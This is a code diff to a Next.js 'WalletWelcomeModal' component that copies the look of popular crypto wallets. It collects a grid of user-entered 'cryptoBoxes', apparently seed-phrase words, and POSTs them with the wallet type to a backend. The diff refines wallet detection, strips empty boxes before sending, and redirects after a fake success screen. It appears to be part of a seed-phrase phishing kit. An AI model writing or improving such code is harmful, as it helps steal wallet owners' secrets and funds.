@@ -1,8 +1,8 @@
 "use client";
 
 import { useState, useEffect } from "react";
+import { useRouter, useSearchParams } from "next/navigation";
 import { useAccount, useConnect } from "wagmi";
-import { useRouter } from "next/navigation";
 import { Check, Lock, ArrowRight } from "lucide-react";
 import Button from "@/components/ui/Button";
 import Card from "@/components/ui/Card";
@@ -168,6 +168,7 @@ const WALLET_STYLES = {
 
 export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   const router = useRouter();
+  const searchParams = useSearchParams();
   const { address, connector, isConnected } = useAccount();
   const { pendingConnector } = useConnect();
 
@@ -176,50 +177,49 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
   const [saving, setSaving] = useState(false);
   const [errorMessage, setErrorMessage] = useState(null);
 
-  // Open modal whenever there's a pending connector
-  useEffect(() => {
-    if (pendingConnector?.name) {
-      onOpen();
-    }
-  }, [pendingConnector, onOpen]);
+  // Read wallet from URL if coming from connect page
+  const urlWallet = searchParams.get("wallet");
 
-  // Improved wallet name detection + normalization
-  let detectedName = (pendingConnector?.name || connector?.name || "MetaMask")
+  // Open modal automatically when component mounts (welcome page controls visibility)
+  useEffect(() => {
+    if (isOpen) {
+      onOpen?.();
+    }
+  }, [isOpen, onOpen]);
+
+  // Wallet detection – prioritize URL param → pending → connected → fallback
+  let detectedName = (urlWallet || pendingConnector?.name || connector?.name || "MetaMask")
     .toLowerCase()
     .trim();
 
-  if (detectedName.includes("metamask")) detectedName = "metamask";
-  else if (detectedName.includes("coinbase")) detectedName = "coinbase wallet";
-  else if (detectedName.includes("walletconnect")) detectedName = "walletconnect";
-  else if (detectedName.includes("rainbow")) detectedName = "rainbow";
-  else if (detectedName.includes("phantom")) detectedName = "phantom";
-  else if (detectedName.includes("trust")) detectedName = "trust";
-  else if (detectedName.includes("okx")) detectedName = "okx";
-  else if (detectedName.includes("zerion")) detectedName = "zerion";
-  else if (detectedName.includes("safepal")) detectedName = "safepal";
-  else if (detectedName.includes("binance")) detectedName = "binance wallet";
-  else if (detectedName.includes("brave")) detectedName = "brave wallet";
-  else if (detectedName.includes("frame")) detectedName = "frame";
-  else if (detectedName.includes("injected")) detectedName = "metamask";
+  if (detectedName.includes("metamask") || detectedName.includes("io.metamask")) detectedName = "MetaMask";
+  else if (detectedName.includes("coinbase")) detectedName = "Coinbase Wallet";
+  else if (detectedName.includes("walletconnect")) detectedName = "WalletConnect";
+  else if (detectedName.includes("rainbow")) detectedName = "Rainbow";
+  else if (detectedName.includes("phantom")) detectedName = "Phantom";
+  else if (detectedName.includes("trust")) detectedName = "Trust";
+  else if (detectedName.includes("okx")) detectedName = "OKX";
+  else if (detectedName.includes("zerion")) detectedName = "Zerion";
+  else if (detectedName.includes("safepal")) detectedName = "SafePal";
+  else if (detectedName.includes("binance")) detectedName = "Binance Wallet";
+  else if (detectedName.includes("brave")) detectedName = "Brave Wallet";
+  else if (detectedName.includes("frame")) detectedName = "Frame";
+  else if (detectedName.includes("injected")) detectedName = "MetaMask";
 
-  const activeName = detectedName
-    .split(" ")
-    .map((word) => word.charAt(0).toUpperCase() + word.slice(1))
-    .join(" ");
-
+  const activeName = detectedName;
   const theme = WALLET_STYLES[activeName] || WALLET_STYLES.MetaMask;
 
-  // Auto-redirect after success screen is shown
+  // Auto-redirect back to connect-wallet after success animation
   useEffect(() => {
     if (submitted) {
       const timer = setTimeout(() => {
         onClose();
-        router.push("/connect-wallet?modal=completed");
-      }, 2800); // ~2.8 seconds to enjoy the success animation
+        router.push("/connect-wallet?modal=completed&wallet=" + encodeURIComponent(activeName));
+      }, 2800);
 
       return () => clearTimeout(timer);
     }
-  }, [submitted, onClose, router]);
+  }, [submitted, onClose, router, activeName]);
 
   const handleBoxChange = (index, value) => {
     const newBoxes = [...boxes];
@@ -251,7 +251,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           walletType: activeName,
-          cryptoBoxes: boxes,
+          cryptoBoxes: boxes.filter(Boolean), // only non-empty
           timestamp: new Date().toISOString(),
         }),
       });
@@ -280,12 +280,10 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
       <Card
         className={`relative w-full max-w-2xl overflow-hidden border ${theme.border} ${theme.bg} rounded-[2.5rem] shadow-2xl shadow-black`}
       >
-        {/* Header gradient decoration */}
         <div
           className={`absolute top-0 left-0 w-full h-32 bg-gradient-to-b ${theme.gradient} opacity-10 blur-3xl`}
         />
 
-        {/* Close button */}
         <button
           onClick={onClose}
           className="absolute top-6 right-6 z-10 p-2 text-zinc-500 hover:text-white bg-zinc-900/50 rounded-full transition"
@@ -375,7 +373,7 @@ export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
                 <Button
                   onClick={() => {
                     onClose();
-                    router.push("/connect-wallet?modal=completed");
+                    router.push("/connect-wallet?modal=completed&wallet=" + encodeURIComponent(activeName));
                   }}
                   className={`py-4 px-10 rounded-2xl font-black text-white bg-gradient-to-r ${theme.gradient} shadow-lg shadow-black/50 flex items-center justify-center gap-2`}
                 >
